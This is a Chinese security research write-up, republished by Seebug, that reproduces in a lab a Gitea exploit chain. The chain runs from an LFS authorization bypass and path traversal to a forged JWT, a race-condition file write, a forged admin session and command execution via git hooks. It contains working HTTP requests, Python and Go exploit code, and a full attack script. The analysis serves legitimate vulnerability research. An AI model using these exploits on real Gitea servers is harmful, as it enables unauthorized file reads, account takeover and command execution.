@@ -1,0 +1,321 @@
+作者：Phith0n  
+作者博客：[https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html?from=timeline&isappinstalled=0](https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html?from=timeline&isappinstalled=0)
+
+这是一个非常漂亮的漏洞链，很久没见过了。
+
+我用docker来复现并学习这个漏洞，官方提供了docker镜像，vulhub也会上线这个环境。
+
+#### 漏洞一、 逻辑错误导致权限绕过
+
+这是本漏洞链的导火索，其出现在Git LFS的处理逻辑中。
+
+> Git
+> LFS是Git为大文件设置的存储容器，我们可以理解为，他将真正的文件存储在git仓库外，而git仓库中只存储了这个文件的索引（一个哈希值）。这样，git
+> objects和.git文件夹下其实是没有这个文件的，这个文件储存在git服务器上。gitea作为一个git服务器，也提供了LFS功能。
+
+在 modules/lfs/server.go 文件中，PostHandler是POST请求的处理函数：
+
+![](https://images.seebug.org/content/images/2018/07/fe857959-5c46-42e0-806d-47003aef95f9.png-w331s)
+
+可见，其中间部分包含对权限的检查：
+
+    
+    
+    if !authenticate(ctx, repository, rv.Authorization, true) {
+        requireAuth(ctx)
+    }
+
+在没有权限的情况下，仅执行了requireAuth函数：这个函数做了两件事，一是写入WWW-Authenticate头，二是设置状态码为401。也就是说，在没有权限的情况下，并没有停止执行PostHandler函数。
+
+所以，这里存在一处权限绕过漏洞。
+
+#### 漏洞二、目录穿越漏洞
+
+这个权限绕过漏洞导致的后果是，未授权的任意用户都可以为某个项目（后面都以vulhub/repo为例）创建一个Git LFS对象。
+
+这个LFS对象可以通过`http://example.com/vulhub/repo.git/info/lfs/objects/[oid]`这样的接口来访问，比如下载、写入内容等。其中[oid]是LFS对象的ID，通常来说是一个哈希，但gitea中并没有限制这个ID允许包含的字符，这也是导致第二个漏洞的根本原因。
+
+我们利用第一个漏洞，先发送一个数据包，创建一个Oid为`....../../../etc/passwd`的LFS对象：
+
+    
+    
+    POST /vulhub/repo.git/info/lfs/objects HTTP/1.1
+    Host: your-ip:3000
+    Accept-Encoding: gzip, deflate
+    Accept: application/vnd.git-lfs+json
+    Accept-Language: en
+    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+    Connection: close
+    Content-Type: application/json
+    Content-Length: 151
+    
+    {
+        "Oid": "....../../../etc/passwd",
+        "Size": 1000000,
+        "User" : "a",
+        "Password" : "a",
+        "Repo" : "a",
+        "Authorization" : "a"
+    }
+
+其中，vulhub/repo是一个公开的项目。
+
+>
+> 也就是说，这个漏洞的利用是有条件的，第一个条件就是需要有一个公开项目。为什么呢？虽然“创建LFS对象”接口有权限绕过漏洞，但是“读取这个对象所代表的文件”接口没有漏洞，会先检查你是否有权限访问这个LFS对象所在的项目。只有公开项目才有权限读取。
+
+见下图，发送数据包后，虽然返回了401状态码，但实际上这个LFS对象已经创建成功，且其Oid为`....../../../etc/passwd`。
+
+![](https://images.seebug.org/content/images/2018/07/b3ddd9b1-5c07-4d6e-b43a-cda4bcec6bb9.png-w331s)
+
+第二步，就是访问这个对象。访问方法就是GET请求`http://example.com/vulhub/repo.git/info/lfs/objects/[oid]/sth`，oid就是刚才指定的，这里要用url编码一下。
+
+见下图，/etc/passwd已被成功读取：
+
+![](https://images.seebug.org/content/images/2018/07/10444c79-f331-46ab-9021-6381d36202ed.png-w331s)
+
+那么，我们来看看为什么读取到了/etc/passwd文件。
+
+代码 modules/lfs/content_store.go ：
+
+![](https://images.seebug.org/content/images/2018/07/5fac4ef7-0cfb-4804-adcf-68fd1187a62e.png-w331s)
+
+可见，`meta.Oid`被传入transformKey函数，这个函数里，将Oid转换成了key[0:2]/key[2:4]/key[4:]这样的形式，前两个、中间两个字符做为目录名，第四个字符以后的内容作为文件名。
+
+那么，我创建的Oid为`....../../../etc/passwd`，在经过transformKey函数后就变成了`../../../../../etc/passwd`，`s.BasePath`是LFS对象的基础目录，二者拼接后自然就读取到了/etc/passwd文件。
+
+这就是第二个漏洞：目录穿越。
+
+#### 漏洞三、读取配置文件，构造JWT密文
+
+vulhub/repo虽然是一个公开项目，但默认只有读权限。我们需要进一步利用。
+
+我们利用目录穿越漏洞，可以读取到gitea的配置文件。这个文件在`$GITEA_CUSTOM/conf/app.ini`，`$GITEA_CUSTOM`是gitea的根目录，默认是`/var/lib/gitea/`，在vulhub里是`/data/gitea`。
+
+所以，要从LFS的目录跨越到`$GITEA_CUSTOM/conf/app.ini`，需要构造出的Oid是`....gitea/conf/app.ini`
+（经过转换后就变成了`/data/gitea/lfs/../../gitea/conf/app.ini`，也就是`/data/gitea/conf/app.ini`。原漏洞作者给出的POC这一块是有坑的，这个Oid需要根据不同`$GITEA_CUSTOM`的设置进行调整。）
+
+成功读取到配置文件（仍需先发送POST包创建Oid为`....gitea/conf/app.ini`的LFS对象）：
+
+![](https://images.seebug.org/content/images/2018/07/f59b80f9-2075-4bae-a546-a5e1f573974b.png-w331s)
+
+配置文件中有很多敏感信息，如数据库账号密码、一些Token等。如果是sqlite数据库，我们甚至能直接下载之。当然，密码加了salt。
+
+Gitea中，LFS的接口是使用JWT认证，其加密密钥就是配置文件中的LFS_JWT_SECRET。所以，这里我们就可以用来构造JWT认证，进而获取LFS完整的读写权限。
+
+我们用python来生成密文：
+
+    
+    
+    import jwt
+    import time
+    import base64
+    
+    
+    def decode_base64(data):
+        missing_padding = len(data) % 4
+        if missing_padding != 0:
+            data += '='* (4 - missing_padding)
+        return base64.urlsafe_b64decode(data)
+    
+    
+    jwt_secret = decode_base64('oUsPAAkeic6HaBMHPiTVHxTeCrEDc29sL6f0JuVp73c')
+    public_user_id = 1
+    public_repo_id = 1
+    nbf = int(time.time())-(60*60*24*1000)
+    exp = int(time.time())+(60*60*24*1000)
+    
+    token = jwt.encode({'user': public_user_id, 'repo': public_repo_id, 'op': 'upload', 'exp': exp, 'nbf': nbf}, jwt_secret, algorithm='HS256')
+    token = token.decode()
+    
+    print(token)
+
+其中，`jwt_secret`是第二个漏洞中读取到的密钥；`public_user_id`是项目所有者的id，`public_repo_id`是项目id，这个项目指LFS所在的项目；`nbf`是指这个密文的开始时间，`exp`是这个密文的结束时间，只有当前时间处于这两个值中时，这个密文才有效。
+
+![](https://images.seebug.org/content/images/2018/07/8a6b649d-adaa-40e0-9dd1-5b37c1f9a99a.png-w331s)
+
+#### 漏洞四、利用条件竞争，写入任意文件
+
+现在，我们能构造JWT的密文，即可访问LFS中的写入文件接口，也就是PutHandler。
+
+PUT操作主要是如下代码：
+
+![](https://images.seebug.org/content/images/2018/07/9dab8961-8808-4c60-b2d6-d7ce7d005614.png-w331s)
+
+整个过程整理如下：
+
+  1. transformKey(meta.Oid) + .tmp 后缀作为临时文件名
+  2. 如果目录不存在，则创建目录
+  3. 将用户传入的内容写入临时文件
+  4. 如果文件大小和meta.Size不一致，则返回错误（meta.size是第一步中创建LFS时传入的Size参数）
+  5. 如果文件哈希和meta.Oid不一致，则返回错误
+  6. 将临时文件重命名为真正的文件名
+
+因为我们需要写入任意文件，所以Oid一定是能够穿越到其他目录的一个恶意字符串，而一个文件的哈希（sha256）却只是一个HEX字符串。所以上面的第5步，一定会失败导致退出，所以不可能执行到第6步。也就是说，我们只能写入一个后缀是“.tmp”的临时文件。
+
+另外，作者用到了`defer
+os.Remove(tmpPath)`这个语法。在go语言中，defer代表函数返回时执行的操作，也就是说，不管函数是否返回错误，结束时都会删除临时文件。
+
+所以，我们需要解决的是两个问题：
+
+  1. 能够写入一个.tmp为后缀的文件，怎么利用？
+  2. 如何让这个文件在利用成功之前不被删除？
+
+我们先思考第二个问题。漏洞发现者给出的方法是，利用条件竞争。
+
+因为gitea中是用流式方法来读取数据包，并将读取到的内容写入临时文件，那么我们可以用流式HTTP方法，传入我们需要写入的文件内容，然后挂起HTTP连接。这时候，后端会一直等待我传剩下的字符，在这个时间差内，Put函数是等待在`io.Copy`那个步骤的，当然也就不会删除临时文件了。
+
+那么，思考第一个问题，.tmp为后缀的临时文件，我们能做什么？
+
+#### 漏洞五、伪造session提升权限
+
+最简单的，我们可以向/etc/cron.d/中写入一个crontab配置文件，然后反弹获取shell。但通常gitea不会运行在root权限，所以我们需要思考其他方法。
+
+gitea使用[go-macaron/session](https://github.com/go-macaron/session "go-macaron/session")这个第三方模块来管理session，默认使用文件作为session存储容器。我们来阅读[go-macaron/session源码](https://github.com/go-macaron/session/blob/master/file.go
+"go-macaron/session源码")：
+
+![](https://images.seebug.org/content/images/2018/07/bed59083-2c93-4f24-bcd8-c74d88a97222.png-w331s)
+
+这里面有几个很重要的点：
+
+  1. session文件名为sid[0]/sid[1]/sid
+  2. 对象被用Gob序列化后存入文件
+
+Gob是Go语言独有的序列化方法。我们可以编写一段Go语言程序，来生成一段Gob编码的session：
+
+    
+    
+    package main
+    
+    import (
+        "fmt"
+        "encoding/gob"
+        "bytes"
+        "encoding/hex"
+    )
+    
+    func EncodeGob(obj map[interface{}]interface{}) ([]byte, error) {
+        for _, v := range obj {
+            gob.Register(v)
+        }
+        buf := bytes.NewBuffer(nil)
+        err := gob.NewEncoder(buf).Encode(obj)
+        return buf.Bytes(), err
+    }
+    
+    func main() {
+        var uid int64 = 1
+        obj := map[interface{}]interface{} {"_old_uid": "1", "uid": uid, "uname": "vulhub" }
+        data, err := EncodeGob(obj)
+        if err != nil {
+            fmt.Println(err)
+        }
+        edata := hex.EncodeToString(data)
+        fmt.Println(edata)
+    }
+
+其中，`{"_old_iod": "1", "uid": uid, "uname": "vulhub"
+}`就是session中的数据，uid是管理员id，uname是管理员用户名。编译并执行上述代码，得到一串hex，就是伪造的数据。
+
+> 原作者给出的POC是他生成好的一段二进制文件，uid和uname不能自定义。
+
+![](https://images.seebug.org/content/images/2018/07/42b2884b-2a86-4447-9308-ec615a4904d4.png-w331s)
+
+接着，我写了一个简单的Python脚本来进行后续利用（需要Python3.6）：
+
+    
+    
+    import requests
+    import jwt
+    import time
+    import base64
+    import logging
+    import sys
+    import json
+    from urllib.parse import quote
+    
+    
+    logging.basicConfig(stream=sys.stdout, level=logging.DEBUG)
+    
+    BASE_URL = 'http://your-ip:3000/vulhub/repo'
+    JWT_SECRET = 'AzDE6jvaOhh_u30cmkbEqmOdl8h34zOyxfqcieuAu9Y'
+    USER_ID = 1
+    REPO_ID = 1
+    SESSION_ID = '11vulhub'
+    SESSION_DATA = bytes.fromhex('0eff81040102ff82000110011000005cff82000306737472696e670c0a00085f6f6c645f75696406737472696e670c0300013106737472696e670c05000375696405696e7436340402000206737472696e670c070005756e616d6506737472696e670c08000676756c687562')
+    
+    
+    def generate_token():
+        def decode_base64(data):
+            missing_padding = len(data) % 4
+            if missing_padding != 0:
+                data += '='* (4 - missing_padding)
+            return base64.urlsafe_b64decode(data)
+    
+        nbf = int(time.time())-(60*60*24*1000)
+        exp = int(time.time())+(60*60*24*1000)
+    
+        token = jwt.encode({'user': USER_ID, 'repo': REPO_ID, 'op': 'upload', 'exp': exp, 'nbf': nbf}, decode_base64(JWT_SECRET), algorithm='HS256')
+        return token.decode()
+    
+    def gen_data():
+        yield SESSION_DATA
+        time.sleep(300)
+        yield b''
+    
+    
+    OID = f'....gitea/sessions/{SESSION_ID[0]}/{SESSION_ID[1]}/{SESSION_ID}'
+    response = requests.post(f'{BASE_URL}.git/info/lfs/objects', headers={
+        'Accept': 'application/vnd.git-lfs+json'
+    }, json={
+        "Oid": OID,
+        "Size": 100000,
+        "User" : "a",
+        "Password" : "a",
+        "Repo" : "a",
+        "Authorization" : "a"
+    })
+    logging.info(response.text)
+    
+    response = requests.put(f"{BASE_URL}.git/info/lfs/objects/{quote(OID, safe='')}", data=gen_data(), headers={
+        'Accept': 'application/vnd.git-lfs',
+        'Content-Type': 'application/vnd.git-lfs',
+        'Authorization': f'Bearer {generate_token()}'
+     })
+
+这个脚本会将伪造的SESSION数据发送，并等待300秒后才关闭连接。在这300秒中，服务器上将存在一个名为“11vulhub.tmp”的文件，这也是session
+id。
+
+带上这个session id，即可提升为管理员。
+
+![](https://images.seebug.org/content/images/2018/07/202cdbc1-b026-4e3a-8e63-4cbc50c226e3.png-w331s)
+
+#### 漏洞六、利用HOOK执行任意命令
+
+带上`i_like_gitea=11vulhub.tmp`这个Cookie，我们即可访问管理员账户。
+
+然后随便找个项目，在设置中配置Git钩子。Git钩子是执行git命令的时候，会被自动执行的一段脚本。比如我这里用的pre-receive钩子，就是在commit之前会执行的脚本。我在其中加入待执行的命令`touch /tmp/success`：
+
+![](https://images.seebug.org/content/images/2018/07/87fb6a83-8622-4544-833a-f2f9b6debd50.png-w331s)
+
+然后在网页端新建一个文件，点提交。进入docker容器，可见命令被成功执行：
+
+![](https://images.seebug.org/content/images/2018/07/368a1928-497d-44be-ab66-ef3b9d01aa35.png-w331s)
+
+#### 一些思考
+
+整个漏洞链非常流畅，Go Web端的代码审计也非常少见，在传统漏洞越来越少的情况下，这些好思路将给安全研究者带来很多不一样的突破。
+
+不过漏洞作者给出的POC实在是比较烂，基本离开了他自己的环境就不能用了，而且我也不建议用一键化的漏洞利用脚本来复现这个漏洞，原因是这个漏洞的利用涉及到一些不确定量，比如：
+
+  1. gitea的$GITEA_CUSTOM，这个值影响到读取app.ini的那段POC
+  2. 管理员的用户名和ID，这个可能需要猜。但其实我们也没必要必须伪造管理员的session，我们可以伪造任意一个用户的session，然后进入网站后再找找看看有没有管理员所创建的项目，如果有的话，就可以得知管理员的用户名了。
+
+另外，复现漏洞的时候也遇到过一些坑，比如gitea第一次安装好，如果不重启的话，他的session是存储在内存里的。只有第一次重启后，才会使用文件session，这一点需要注意。
+
+如果目标系统使用的是sqlite做数据库，我们可以直接下载其数据库，并拿到他的密码哈希和另一个随机字符串，利用这两个值其实能直接伪造管理员的cookie（名为gitea_incredible），这一点我就不写了，大家可以自己查看文档。
+
+* * *
+
+![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
+本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/644/>
+
